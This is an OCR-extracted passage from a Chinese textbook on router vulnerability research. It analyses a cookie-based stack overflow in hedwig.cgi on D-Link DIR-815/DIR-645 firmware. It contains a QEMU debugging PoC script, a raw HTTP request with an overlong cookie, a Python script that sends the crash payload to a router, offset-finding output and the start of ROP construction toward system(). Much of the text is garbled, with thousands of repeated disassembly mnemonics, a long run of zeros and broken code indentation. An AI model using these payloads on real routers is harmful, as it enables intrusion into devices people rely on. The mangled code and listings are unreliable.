word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

 </div>

xrefs to aHttp_cookie

Dire...
Address
Text
UUp o sess getuid+6C
$a0,aHttp_cookie#^HTTP_COOKIE^

 </div>

xrefs to sess_get_uid

Dire...
... Address
Text

LUp p phpcg_main+2B8 jal $t9; sess_get_uid
LUp p sess_logout+34 jal sess_get_uid
LUp p authentication+338 jal sess_get_uid
LUp p sess_generate_captch... jal sess_get_uid
LUp p sess_validate+5C jal sess_get_uid
LDo...p hedwigcg_main+1B8 jal $t9; sess_get_uid
LDo...p pigwidgeoncgi_main+164 jal $t9; sess_get_uid
LUp o phpcg_main+2B0 la $t9, sess_get_uid

 </div>

X IDA ViewA | X " : Strings window | X | Hex ViewA | X | Structures | X En Enums | X Imports | X | Exports
, text:00409648
, text:00409644
, text:00409648
, text:0040964C
, text:00409650
, text:00409654
, text:00409658
, text:0040965C
, text:00409660
, text:00409664
, text:00409668
, text:0040966C
, text:00409670
, text:00409674
, text:00409678
, text:0040967C
, text:00409680
, text:00409684
, text:00409688

la
nop
jalr
move
lw
nop
la
nop
nop
la
nop
jalr
move
lw
lui
la
move
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move
la
move

 </div>

接下来我们采用动态调试进行验证。

漏洞测试脚本（POC） pentest_cgi.sh

!/bin/bash
# pentest_cgi.sh
# sudo ./pentest_cgi.sh 'uid=1234' 'python -c "print
'uid=1234&password='+'A*0x600''
INPUT=$1"
TEST=$2"
LEN=$(echo -n "$INPUT" | wc -c).PORT="1234"
if [ "$LEN" == "0" ] || [ "$INPUT" == "-h" ] || [ "$UID" != "0" ]
then
echo -e "\nUsage: sudo $0 \n"

10 exit 1
11 fi
12 cp $(which qemu-mipsel) ./qemu
13 echo "$INPUT" | chroot . ./qemu -E CONTENT LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$TEST -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="192.168.1.1" -g $PORT /htdocs/web/hedwig.cgi 2>/dev/null
14 echo 'run ok'

15 rm -f ./qemu

第 3 行：在控制台中输入第 3 行内容（除开头的“#”外），pentest_cgi.sh 就会开始运行并等待 IDA 连接进行测试。

第 7 行：QEMU 开启调试端口指定为 1234。

第 6 行：获取脚本 pentest_cgi.sh 提供的第 1 个参数的长度。

第 13 行：将 QEMU-MIPSEL 复制到当前目录下，并重命名为 “qemu”。

第 14 行：使用 QEMU 模拟执行 hedwig.cgi，并设置 HTTP_COOKIE 等环境变量。其中，HTTP_COOKIE 环境变量来自 pentest_cgi.sh 提供的第 2 个参数。

建立好测试脚本以后，针对该漏洞的调试方法如下。

01 建立 pentest_cgi.sh 脚本，让 QEMU 运行 hedwig.cgi，等待 GDB 连接到 1234 端口，使用如下命令执行脚本。

sudo ./pentest_cgi.sh 'uid=1234' `python -c "print 'uid=1234&password=' + 'A' * 0x600'

02 IDA 加载 cgibin 以后，按 “Ctrl+G” 组合键跳转到前面查出的可疑漏洞函数 sprintf 入口地址 0x00409680 处下断点。

03 使用 IDA 附加程序，按 “F9” 键运行程序，会被中断在漏洞函数断点处。对比 saved_ra 地址处的数据，在 sprintf 函数执行前后，如果 saved_ra 在 sprintf 执行前没有改变，而在执行后被覆盖为 “0x41414141”，那么可以确定最终是该函数导致了溢出。

按照上面的方法调试漏洞，过程如图 10-11 所示。

当 IDA 附加 hedwig.cgi 进程以后，按 “F5” 键运行至 sprintf 断点，断点前后存放 $ra 区域如图 10-12 所示。

可以看到，$ra 确实被覆盖了，而且该漏洞也能够如愿以偿地在函数返回时控制执行流程，如图 10-13 所示。

到这里我们还不能下结论说 0x00409680 处的 sprintf 函数造成了溢出。我们先来阅读一下 0x00409680 后面的汇编代码。

在 0x004096B4 位置，hedwig.cgi 以写方式打开 /var/tmp/temp.xml，但是在对固件提取的目录进行检查时发现，/var 目录下是空的，不存在 /var/tmp 目录，其代码如图 10-14 所示。

 </div>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>A0</td><td style='text-align: center; word-wrap: break-word;'>407FF580</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:347FFE27A1</td><td style='text-align: center; word-wrap: break-word;'>00000001</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>FY:dword_0+1</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>A2</td><td style='text-align: center; word-wrap: break-word;'>0042E000</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:0842E000A3</td><td style='text-align: center; word-wrap: break-word;'>00000020</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:00000020</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>T0</td><td style='text-align: center; word-wrap: break-word;'>408C74C8</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:468C74CPT1</td><td style='text-align: center; word-wrap: break-word;'>000012C9</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:600012C9</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>T2</td><td style='text-align: center; word-wrap: break-word;'>00000002</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:dword_0+2T3</td><td style='text-align: center; word-wrap: break-word;'>00000024</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:00000024</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>T4</td><td style='text-align: center; word-wrap: break-word;'>00000025</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:00000025T5</td><td style='text-align: center; word-wrap: break-word;'>000000807</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:000000807</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>T6</td><td style='text-align: center; word-wrap: break-word;'>000000800</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:000000800T7</td><td style='text-align: center; word-wrap: break-word;'>000000400</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:000000400</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>S0</td><td style='text-align: center; word-wrap: break-word;'>41414141</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:41414141S1</td><td style='text-align: center; word-wrap: break-word;'>41414141</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:41414141</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>S2</td><td style='text-align: center; word-wrap: break-word;'>41414141</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:41414141S3</td><td style='text-align: center; word-wrap: break-word;'>41414141</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:41414141</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>S4</td><td style='text-align: center; word-wrap: break-word;'>41414141</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:41414141S5</td><td style='text-align: center; word-wrap: break-word;'>41414141</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:41414141</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>S6</td><td style='text-align: center; word-wrap: break-word;'>41414141</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:41414141S7</td><td style='text-align: center; word-wrap: break-word;'>41414141</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:41414141</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>T8</td><td style='text-align: center; word-wrap: break-word;'>00000008</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:00000008T9</td><td style='text-align: center; word-wrap: break-word;'>00000000</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:dword_0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>K0</td><td style='text-align: center; word-wrap: break-word;'>00000000</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:dword_0K1</td><td style='text-align: center; word-wrap: break-word;'>00000000</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:dword_0</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>GP</td><td style='text-align: center; word-wrap: break-word;'>004345D0</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:004345D0SP</td><td style='text-align: center; word-wrap: break-word;'>407FF598</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:407FF598</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>FP</td><td style='text-align: center; word-wrap: break-word;'>41414141</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:41414141RA</td><td style='text-align: center; word-wrap: break-word;'>41414141</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>0FY:41414141</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>LO</td><td style='text-align: center; word-wrap: break-word;'>0001DFCA</td><td style='text-align: center; word-wrap: break-word;'>HI</td><td style='text-align: center; word-wrap: break-word;'>0000003F</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PC</td><td style='text-align: center; word-wrap: break-word;'>00409A54</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>cg1_main+5D4</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PC</td><td style='text-align: center; word-wrap: break-word;'>00409A50</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>00409A50</td><td style='text-align: center; word-wrap: break-word;'>00409A50</td><td style='text-align: center; word-wrap: break-word;'>L</td><td style='text-align: center; word-wrap: break-word;'>00409A50</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Modules</td><td style='text-align: center; word-wrap: break-word;'>Threads</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Decimal</td><td style='text-align: center; word-wrap: break-word;'>Hex</td><td style='text-align: center; word-wrap: break-word;'>State</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>3</td><td style='text-align: center; word-wrap: break-word;'>FFFFF...</td><td style='text-align: center; word-wrap: break-word;'>Ready</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

 </div>

 </div>

这里打开 temp.xml 就会失败。而从汇编代码中可以看到，如果存在 tmp 目录，那么在打开成功的分支上，0x0040997C 处还存在一个 sprintf 函数，而这个 sprintf 函数依然会造成缓冲区溢出，如图 10-15 所示。

 </div>

因此，我们必须先弄清楚在真实的路由器环境中是否存在 /var/tmp 目录，否则，/var/tmp 目录存在与否而导致的模拟环境与真实系统之间环境差异可能导致定位漏洞偏移并在模拟运行 hedwig.cgi 时能够触发漏洞执行代码，但在 DIR-815 路由器设备上却执行失败的假象。

下面，我们利用打开 /var/tmp/temp.xml 文件成功和失败后的两个分支执行返回结果的差异来判断在 DIR-815 路由器中是否存在 /var/tmp 目录。

在没有 /var/tmp 目录时，根据漏洞的调试方法，执行 pentest_cgi.sh 和 IDA 附加程序，让程序执行至异常并退出，CGI 脚本返回的结果如图 10-16 所示。

 </div>

而当我们手工创建 /var/tmp 目录以后，再执行 hedwig.cgi，则不会返回任何结果，如图 10-17 所示。

(×)© embedded@ubuntu-7/DIR-815FW101b141101b14.bin.extracted/squashfs-root

# embedded@ubuntu-7/DIR-815FW101b141101b14.bin.extracted/squashfs-root

# embedded@ubuntu-7/DIR-815FW101b141101b14.bin.extracted/squashfs-root

/pentest_cgl.sh "uld=1234" "python =c "print "uld=123" + "A" 0x600

[sudo] password for embedded:

 </div>

需要说明的是，如果在 DIR-645 路由器上进行相同的漏洞测试时手工建立 /var/tmp 目录，会返回如下结果。

1 <?xml version="1.0" encoding="utf-8"?>
2 <hedwig>
3 <result>OK</result>
4 <node></node>
5 <message>No modules for Hedwig</message>
6 </hedwig>

根据以上结论，我们只需要构造数据包并将其发送到 DIR-815 路由器，根据路由器返回的结果就可以知道该路由器中是否存在 /var/tmp 目录了。

这里的测试中，我们需要构造如下数据包并将其发送到路由器进行验证。

POST /hedwig.cgi HTTP/1.1
Content-Length: 21
Accept-Encoding: gzip, deflate
Connection: close
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: 127.0.0.1
Cookie: uid=AAAAAAAAAAA...(2000个A)...AAAAAAAAAAAAAAA
Content-Type: application/x-www-form-urlencoded
password=123&uid=3Ad4

根据上面的验证数据，利用 Python 建立如下测试脚本。

源码 DIR815-fprintf-test.py

1 import sys
2 import string
3 import socket
4 import urllib, urllib2, httplib
5 class HTTP:
6     HTTP = "http"
7     HTTPS = "https"

揭秘家用路由器 0day 漏洞挖掘技术

def __init__(self, host, proto=HTTP, verbose=False):
    self.host = host
    self.proto = proto
    self.verbose = verbose
    self.encode_params = True
    def Encode(self, string):
        return urllib.quote_plus(string)
    def Send(self, uri, headers={}, data=None, response=False, encode_params=True):
        html = ""
        if uri.startswith('/')
            c = ''
        else:
            c = '/'
        url = '%s://%s%s%s' % (self.proto, self.host, c, uri)
        if self.verbose:
            print url
        if data is not None:
            data = urllib.unquote(urllib.urlencode(data))
        req = urllib2.Request(url, data, headers)
        rsp = urllib2.urlopen(req)
        if response:
            html = rsp.read()
            #print rsp.status
        print html
        return html
    if __name__ == 'main':
        ip='192.168.0.1'
        pdata = {
            'password': '123',
            'uid': '3Ad4'
        }
        #print payload.Print()
        header = {
            'Cookie': 'uid='+'A'\*2000,
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'Keep-Alive',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)'
        }
    }
    try:
        HTTP(ip).Send('hedwig.cgi',

data=data,headers=header,encode_params=False,response=True)
48 except httplib.BadStatusLine:
49    print "Payload delivered."
50 except Exception, e:
51    print "Payload delivery failed: %s" % str(e)

第 15 行～第 32 行：Send() 函数，其中在第 26 行发送请求以后，如果 Web 服务器有回复数据，将在第 31 行打印出来。

第 35 行～第 38 行：构造 HTTP 的 POST 参数。

第 40 行～第 45 行：构造 HTTP 的头部，其中 cookie 超长。

第 47 行：调用 Send 函数发送构造的数据包。

检查 DIR-815 路由器的返回结果，如图 10-18 所示。

C:\windows\system32\cmd.exe

100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000

 </div>

出现这个结果是因为远程路由器中程序崩溃，返回了内部服务器错误，没有返回其他任何信息。因此我们判断，在真实的路由器中是存在 /var/tmp 目录的，造成 hedwig.cgi 中的缓冲区溢出的罪魁祸首不是 0x004096B4 处的 sprintf 函数，而是成功打开 /var/tmp/temp.xml 文件之后位于 0x0040997C 处的 sprintf 函数。

现在，我们才找到了 hedwig.cgi 中造成缓冲区溢出真正的位置，它是位于 0x0040997C 处的 sprintf 函数。重新审视这个漏洞：该漏洞产生了两处缓冲区溢出，如果不细心分析，可能会以为是位于 0x004096B4 处的 sprintf 函数造成了缓冲区溢出。但是，经过仔细推敲和验证，证实该漏洞存在于 0x0040997C 处的 sprintf 函数中，也就是说，造成第二次溢出时才能利用，整个流程如图 10-19 所示。

现在我们已经弄清楚了整个漏洞的原理。该漏洞在接收来自攻击者伪造数据包中超长的Cookie后，位于hedwig_main函数中调用sess_get_uid函数从HTTP头部中提取Cookie值，但提取Cookie值以后没有校验长度。而使用sobj_get_string函数获取Cookie值时，仍然没有验证Cookie的长度就直接将其作为位于0x0040997C处的sprintf函数的参数格式化到堆栈中，导致了缓冲区溢出。

揭秘家用路由器 0day 漏洞挖掘技术

 </div>

## 10.3 漏洞利用

下面介绍该漏洞的利用方式。

#### 10.3.1 漏洞利用方式：System/Exec

在第 6 章中已经提出了开发一个漏洞利用的大致步骤，这里结合真实的路由器溢出漏洞来重复利用过程，具体如下。

01 劫持 PC，确定缓冲区大小，定位并确定控制偏移。

02 编写代码，通过 QEMU 虚拟机验证并调试。

03 确定攻击路径，构造 ROP。

04 构建攻击利用数据，编写 exploit 代码，对 DIR-645 路由器发送网络包，获取执行权限。

根据上面的步骤，采用在第 6 章中编写的 patternLocOffset.py 对位偏移，生成长度为 2000 字节的定位字符串，存入名为 “test” 的文件中，命令如下。

[*] Create pattern string contains 2000 characters ok!
[+] output to test ok!
[+] take time: 0.0027 s

使用脚本 pentest_cgi.cgi 载入定位字符串进行定位，命令如下。

~/book-source/815/_DIR-815\ FW\ 1.01b14_1.01b14.bin.extracted/squashfs-root$ sudo ./pentest_cgi.sh 'uid=1234'、python -c "print 'uid=+open('test', 'r').read(2000)"

根据漏洞分析的结论，为了模拟真实的运行环境触发漏洞，需要建立 /var/tmp/目录，命令如下。

~/book-source/815/_DIR-815\ FW\ 1.01b14_1.01b14.bin.extracted/squashfs-root$ mkdir ./var/tmp

让程序运行至 hedwig_main 函数返回指令 “jr $ra” 处，地址为 0x0040C5E4。因为这里我们选择攻击路径为使用 system() 函数执行命令，所以选择定位 $SO 的地址 0x67423467，如图 10-20 所示。

 </div>

使用 patternLocOffset.py 定位偏移，可知填充数据偏移应为 973 字节，命令如下。

~/book-source/815/_DIR-815\ FW\ 1.01b14_1.01b14.bin.extracted/squashfs-
oot$ python patternLocOffset.py -s 0x67423467 -l 2000
[*] Create pattern string contains 2000 characters ok!
[*] No exact matches, looking for likely candidates...
[+] Possible match at offset 973 (adjusted another-endian)
[+] take time: 0.0046 s

既然确定了偏移，接下来我们构造 ROP。在 hedwig_main 函数中，溢出数据会覆盖 $SO~$$S7、$FP 及 $RA 寄存器，因此，可以通过充分利用覆盖寄存器实现 system 函数的调用。

#### 10.3.2 绕过0构造ROP Chain

构造 ROP 的步骤如下。

01 搜索 system 函数的地址。

02 函数调用地址，命令为 “call system”。

